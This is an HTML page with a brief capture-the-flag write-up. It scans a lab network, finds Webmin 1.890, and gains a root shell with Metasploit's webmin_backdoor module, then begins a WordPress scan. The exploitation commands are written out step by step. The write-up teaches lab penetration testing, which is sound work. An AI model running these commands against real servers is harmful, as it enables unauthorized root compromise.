<html>

<head>
    <title>Random Easy CTF Writeup</title>
    <link rel="stylesheet" type="text/css" href="index.css">
</head>

<body>
    <article>
        <h1>Random Easy CTF Writeup</h1>
        <p class="last-update">Last update on November 2019.</p>

        <div class="step">
            <p>1. After scanning the range we were given, machine 21 immediately stands up because of the suspiciously
                bad
                Wordpress site running on port 80.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>nmap 172.16.202.0/24</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>2. A more agressive search shows that ports 21 (FTP), 22 (SSH), 80 (Apache) and 10000 (Webmin)
                are being used.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>nmap -A 172.16.202.21</code>
                </div>
            </div>
        </div>

        <h3>Webmin</h3>

        <div class="step">
            <p>3. Webmin is a "web-based interface for system administration for Unix" [<a href="http://www.webmin.com/"
                    target="_blank">source</a>] and so it immediately stood up as the most promising point of entry.</p>
            <div class="code-block">
                <div class="code-line">
                    <code>10000/tcp open <span style="color:red">ssl/http MiniServ 1.890 (Webmin httpd)</span></code>
                </div>
                <div class="code-line">
                    <code>| http-robots.txt: 1 disallowed entry</code>
                </div>
                <div class="code-line">
                    <code>|_/</code>
                </div>
                <div class="code-line">
                    <code>|_http-title: Login to Webmin</code>
                </div>
                <div class="code-line">
                    <code>| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Linux-Debian</code>
                </div>
                <div class="code-line">
                    <code>| Not valid before: 2019-09-09T13:32:42</code>
                </div>
                <div class="code-line">
                    <code>|_Not valid after: 2024-09-07T13:32:42</code>
                </div>
                <div class="code-line">
                    <code>|_ssl-date: TLS randomness does not represent time</code>
                </div>
                <div class="code-line">
                    <code>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>4. Just googling this version of Webmin shows a bunch of vulnerabilities, so we immediately turned to
                Metasploit.</p>
            <span class="step-note">Related: <a href="/metasploit5-on-kali-linux.html" target="_blank">Metasploit 5 on Kali Linux</a>.</span>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>service postgresql start</code>
                </div>
                <br />
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>msfconsole</code>
                </div>
                <div class="code-line">
                    <code>...</code>
                </div>
                <br />
                <div class="code-line">
                    <span class="prompt">msf5 > </span>
                    <code>db_status</code>
                </div>
                <div class="code-line">
                    <code>[*] Connected to msf. Connection type: postgresql.</code>
                </div>
                <br />
                <div class="code-line">
                    <span class="prompt">msf5 > </span>
                    <code>search Webmin</code>
                </div>
                <br />
                <div class="code-line">
                    <code>Matching Modules</code>
                </div>
                <div class="code-line">
                    <code>================</code>
                </div>
                <br />
                <table>
                    <thead>
                        <tr>
                            <td>Name</td>
                            <td>Disclosure Date</td>
                            <td>Rank</td>
                            <td>Check</td>
                            <td>Description</td>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>auxiliary/admin/webmin/edit_html_fileaccess</td>
                            <td>2012-09-06</td>
                            <td>normal</td>
                            <td>No</td>
                            <td>Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access</td>
                        </tr>
                        <tr>
                            <td>auxiliary/admin/webmin/file_disclosure</td>
                            <td>2006-06-30</td>
                            <td>normal</td>
                            <td>No</td>
                            <td>Webmin File Disclosure</td>
                        </tr>
                        <tr>
                            <td>exploit/linux/http/webmin_packageup_rce</td>
                            <td>2019-05-16</td>
                            <td>excellent</td>
                            <td>Yes</td>
                            <td>Webmin Package Updates Remote Command Execution</td>
                        </tr>
                        <tr>
                            <td>exploit/unix/webapp/webmin_backdoor</td>
                            <td>2019-08-10</td>
                            <td>excellent</td>
                            <td>Yes</td>
                            <td>Webmin password_change.cgi Backdoor</td>
                        </tr>
                        <tr>
                            <td>exploit/unix/webapp/webmin_show_cgi_exec</td>
                            <td>2012-09-06</td>
                            <td>excellent</td>
                            <td>Yes</td>
                            <td>Webmin /file/show.cgi Remote Command Execution</td>
                        </tr>
                        <tr>
                            <td>exploit/unix/webapp/webmin_upload_exec</td>
                            <td>2019-01-17</td>
                            <td>excellent</td>
                            <td>Yes</td>
                            <td>Webmin Upload Authenticated RCE</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

        <div class="step">
            <p>5. After some poking around, we realized the machine is vulnerable to this exploit: <a
                    href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/webmin_backdoor.md">unix/webapp/webmin_backdoor</a>.
            </p>
            <span class="step-note"></span>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">msf5 > </span>
                    <code>use exploit/unix/webapp/webmin_backdoor</code>
                </div>
                <br/>
                <div class="code-line">
                    <span class="prompt">msf5 exploit(unix/webapp/webmin_backdoor) ></span>
                    <code>set RHOSTS 172.16.202.21</code>
                </div>
                <div class="code-line">
                    <span class="prompt">msf5 exploit(unix/webapp/webmin_backdoor) ></span>
                    <code>set LHOST eth1</code>
                </div>
                <div class="code-line">
                    <span class="prompt">msf5 exploit(unix/webapp/webmin_backdoor) ></span>
                    <code>set SSL true</code>
                </div>
                <div class="code-line">
                    <span class="prompt">msf5 exploit(unix/webapp/webmin_backdoor) ></span>
                    <code>exploit</code>
                </div>
            </div>
        </div>

        <div class="step">
            <p>6. And we get a shell as root!</p>
        </div>

        <h3>Wordpress</h3>

        <div class="step">
            <p>7. Even though we're already root in the target machine, we still had some time so we decided to explore
                an alternative point of entry: Wordpress.</p>
            <div class="code-block">
                <div class="code-line">
                    <span class="prompt">root@kali:/#</span>
                    <code>wpscan -u 172.16.202.21</code>
                </div>
            </div>
        </div>


    </article>
</body>

</html>